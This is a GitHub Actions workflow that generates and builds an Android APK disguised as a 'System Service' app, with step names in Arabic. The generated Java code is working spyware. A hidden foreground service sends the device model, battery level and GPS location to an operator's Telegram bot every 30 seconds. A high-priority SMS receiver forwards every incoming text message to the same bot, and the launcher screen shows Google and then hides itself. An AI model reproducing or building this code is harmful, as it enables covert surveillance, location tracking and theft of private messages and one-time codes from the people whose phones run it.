name: Hussein V8 The Real Final
on:
  workflow_dispatch:
    inputs:
      bot_token: { required: true }
      chat_id: { required: true }
      app_name: { required: true, default: 'System Service' }

permissions: { contents: write }

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: 1. جلب الكود
        uses: actions/checkout@v4
        
      - name: 2. إعداد لغة جافا
        uses: actions/setup-java@v4
        with: { distribution: 'temurin', java-version: '17' }

      - name: 3. إعداد Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.4' 

      - name: 4. إنشاء Config.java (الملف السري)
        run: |
          mkdir -p app/src/main/java/com/android/system/service
          cat << 'EOF' > app/src/main/java/com/android/system/service/Config.java
          package com.android.system.service;
          public class Config {
              public static final String BOT_TOKEN = "${{ github.event.inputs.bot_token }}";
              public static final String CHAT_ID = "${{ github.event.inputs.chat_id }}";
          }
          EOF

      - name: 5. إنشاء ملف Gradle
        run: |
          echo "include ':app'" > settings.gradle
          cat << 'EOF' > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF
          
          cat << 'EOF' > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.android.system.service'
              compileSdk 34
              defaultConfig {
                  applicationId "com.android.system.service"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              buildTypes { release { minifyEnabled false } }
          }
          dependencies { implementation "com.squareup.okhttp3:okhttp:4.12.0" }
          EOF

      - name: 6. إنشاء AndroidManifest.xml
        run: |
          mkdir -p app/src/main/res/values
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              
              <application android:label="خدمة النظام" android:icon="@android:drawable/sym_def_app_icon">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>
                  </activity>
                  <service android:name=".CommandService" android:exported="false" />
                  <receiver android:name=".SmsReceiver" android:exported="true">
                      <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED"/></intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

      - name: 7. إنشاء TelegramBot.java
        run: |
          cat << 'EOF' > app/src/main/java/com/android/system/service/TelegramBot.java
          package com.android.system.service;
          import android.content.Context;
          import okhttp3.*;
          import java.io.IOException;
          public class TelegramBot {
              public static void sendMessage(Context context, String text) {
                  try {
                      OkHttpClient client = new OkHttpClient();
                      RequestBody body = new FormBody.Builder().add("chat_id", Config.CHAT_ID).add("text", text).add("parse_mode", "HTML").build();
                      Request request = new Request.Builder().url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage").post(body).build();
                      client.newCall(request).enqueue(new okhttp3.Callback() {
                          @Override public void onFailure(okhttp3.Call call, IOException e) {}
                          @Override public void onResponse(okhttp3.Call call, Response response) throws IOException { response.close(); }
                      });
                  } catch (Exception e) {}
              }
          }
          EOF

      - name: 8. إنشاء CommandService.java
        run: |
          cat << 'EOF' > app/src/main/java/com/android/system/service/CommandService.java
          package com.android.system.service;
          import android.app.*;
          import android.content.*;
          import android.os.*;
          import android.telephony.TelephonyManager;
          import android.location.Location;
          import android.location.LocationManager;
          import android.provider.*;
          import java.io.*;
          public class CommandService extends Service {
              private Handler handler;
              @Override public void onCreate() {
                  super.onCreate();
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel("cmd", "Service", NotificationManager.IMPORTANCE_LOW);
                      ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
                      startForeground(1001, new Notification.Builder(this, "cmd").setContentTitle("نشط").setSmallIcon(android.R.drawable.stat_sys_download).build());
                  }
                  TelegramBot.sendMessage(this, "✅ جهاز جديد متصل\n" + Build.MANUFACTURER + " " + Build.MODEL);
                  handler = new Handler();
                  handler.postDelayed(new Runnable() {
                      @Override public void run() {
                          collectAndSend();
                          handler.postDelayed(this, 30000);
                      }
                  }, 5000);
              }
              private void collectAndSend() {
                  StringBuilder info = new StringBuilder("📱 معلومات الجهاز\n");
                  info.append("الموديل: ").append(Build.MODEL).append("\n");
                  info.append("الإصدار: ").append(Build.VERSION.RELEASE).append("\n");
                  BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                  info.append("البطارية: ").append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)).append("%");
                  TelegramBot.sendMessage(this, info.toString());
                  
                  if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                      LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                      Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                      if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                      if (loc != null) {
                          TelegramBot.sendMessage(this, "📍 الموقع\n" + loc.getLatitude() + "," + loc.getLongitude() + "\nhttps://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
                      }
                  }
              }
              @Override public IBinder onBind(Intent intent) { return null; }
          }
          EOF

      - name: 9. إنشاء MainActivity.java
        run: |
          cat << 'EOF' > app/src/main/java/com/android/system/service/MainActivity.java
          package com.android.system.service;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.webkit.WebView;
          public class MainActivity extends Activity {
              @Override protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  WebView w = new WebView(this);
                  w.loadUrl("https://www.google.com");
                  setContentView(w);
                  startService(new Intent(this, CommandService.class));
                  new android.os.Handler().postDelayed(() -> moveTaskToBack(true), 2000);
              }
          }
          EOF

      - name: 10. إنشاء SmsReceiver.java
        run: |
          cat << 'EOF' > app/src/main/java/com/android/system/service/SmsReceiver.java
          package com.android.system.service;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.telephony.SmsMessage;
          public class SmsReceiver extends BroadcastReceiver {
              @Override public void onReceive(Context context, Intent intent) {
                  Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                  for (Object pdu : pdus) {
                      SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                      TelegramBot.sendMessage(context, "📨 SMS من " + sms.getOriginatingAddress() + "\n" + sms.getMessageBody());
                  }
              }
          }
          EOF

      - name: 11. البناء
        run: chmod +x gradlew && ./gradlew assembleRelease

      - name: 12. رفع APK
        uses: actions/upload-artifact@v4
        with:
          name: System-Service-APK
          path: app/build/outputs/apk/release/*.apk
